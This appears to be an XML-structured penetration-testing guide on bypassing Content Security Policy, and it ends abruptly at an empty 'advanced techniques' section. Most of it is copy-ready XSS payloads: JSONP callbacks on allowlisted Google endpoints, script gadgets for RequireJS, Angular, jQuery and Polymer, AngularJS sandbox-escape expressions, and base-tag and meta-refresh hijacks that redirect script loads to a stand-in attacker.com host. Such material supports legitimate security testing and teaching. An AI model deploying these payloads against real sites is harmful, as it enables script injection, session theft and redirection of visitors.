<vulnerability_guide>
  <title>CONTENT SECURITY POLICY BYPASS - ADVANCED</title>

  <critical>Content Security Policy (CSP) is the primary defense against XSS, but misconfigurations are extremely common. Understanding CSP bypass techniques transforms "unexploitable" XSS findings into critical vulnerabilities. Over 90% of CSPs in the wild have at least one bypass vector.</critical>

  <scope>
    - Script gadget attacks
    - JSONP endpoint abuse
    - Angular/framework expression injection
    - Base-uri and meta tag attacks
    - Unsafe CSP directive exploitation
    - Nonce and hash bypass techniques
  </scope>

  <methodology>
    1. CSP ANALYSIS
       {% raw %}
       # Extract and analyze CSP
       curl -I https://target.com | grep -i content-security-policy

       # Common weak directives to look for:
       # 'unsafe-inline' - Direct script execution
       # 'unsafe-eval' - eval() and similar
       # data: in script-src - Data URI scripts
       # * wildcards - Broad allowlist
       # Missing base-uri - Base tag injection
       # Missing form-action - Form hijacking
       # Missing frame-ancestors - Clickjacking

       # CSP Evaluator
       # https://csp-evaluator.withgoogle.com/
       {% endraw %}

    2. JSONP ENDPOINT ABUSE
       {% raw %}
       # Find JSONP endpoints on allowed domains
       # Common patterns:
       # ?callback=
       # ?jsonp=
       # ?cb=

       # If CSP allows *.google.com
       <script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>

       # If CSP allows *.googleapis.com
       <script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)"></script>

       # JSONP to execute arbitrary code
       <script src="https://allowed.com/api?callback=document.body.innerHTML="></script>

       # Common CSP bypass endpoints:
       # - Google APIs
       # - Facebook SDK
       # - jQuery CDNs with JSONP
       # - Analytics scripts
       {% endraw %}

    3. SCRIPT GADGET ATTACKS
       {% raw %}
       # Script gadgets are existing code that can be abused
       # Work even with strict CSP (nonce/hash)

       # RequireJS gadget
       <script data-main="data:,alert(1)"></script>

       # Angular gadget (ng-app on allowed script)
       <div ng-app ng-csp>
         {{$eval.constructor('alert(1)')()}}
       </div>

       # jQuery gadget
       <form class="child">
         <input name="ownerDocument">
         <input name="ownerDocument">
         <script>$.globalEval('alert(1)')</script>
       </form>

       # Polymer gadget
       <template is="dom-bind">
         <div style$="[[alert(1)]]"></div>
       </template>
       {% endraw %}

    4. ANGULAR EXPRESSION INJECTION
       {% raw %}
       # If Angular is allowed and ng-app exists

       # Angular 1.x (various versions)
       {{constructor.constructor('alert(1)')()}}
       {{$on.constructor('alert(1)')()}}
       {{'a]'.constructor.prototype.charAt=''.valueOf;$eval("x]alert(1)")}}

       # Angular 1.6+ sandbox bypass
       {{$new.constructor('alert(1)')()}}

       # AngularJS sandbox escapes by version
       # 1.0-1.1: {{constructor.constructor('alert(1)')()}}
       # 1.2-1.5: Various expression-based
       # 1.6+: Sandbox removed but CSP mode
       {% endraw %}

    5. BASE TAG AND META TAG ATTACKS
       {% raw %}
       # If base-uri not restricted in CSP

       # Relative URL hijacking
       <base href="https://attacker.com/">
       <!-- All relative script/link/form URLs now go to attacker -->

       # If HTML injection before script tag
       <base href="https://attacker.com/fake-path/">
       <script src="/legitimate.js"></script>
       <!-- Loads https://attacker.com/fake-path/legitimate.js -->

       # Meta refresh for redirect (if not blocked)
       <meta http-equiv="refresh" content="0;url=https://attacker.com/">
       {% endraw %}
  </methodology>

  <advanced_techniques>
